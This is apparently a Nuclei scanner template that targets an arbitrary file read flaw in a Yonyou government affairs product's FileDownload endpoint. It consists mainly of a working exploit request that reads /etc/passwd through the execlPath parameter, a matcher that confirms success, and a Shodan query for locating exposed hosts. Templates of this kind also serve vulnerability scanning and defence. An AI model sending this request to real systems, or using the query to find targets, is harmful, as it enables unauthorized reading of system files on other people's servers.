id: yonyou_government_affairs_FileDownload_arbitrary_fileread

info:
  name: yonyou_government_affairs_FileDownload_arbitrary_fileread
  author: HK
  severity: high
  description: yonyou - government affairs - FileDownload - arbitrary file read
  metadata:
    max-request: 1
    shodan-query: body="/df/portal/getYearRgcode.do"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /bg/attach/FileDownload?execlPath=/etc/passwd HTTP/1.1
    Host: {{Hostname}}
    Connection: keep-alive
    Accept: application/json, text/javascript, */*; q=0.01
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: zh-CN,zh;q=0.9

  redirects: true
  matchers:
    - type: word
      part: body
      words:
        - root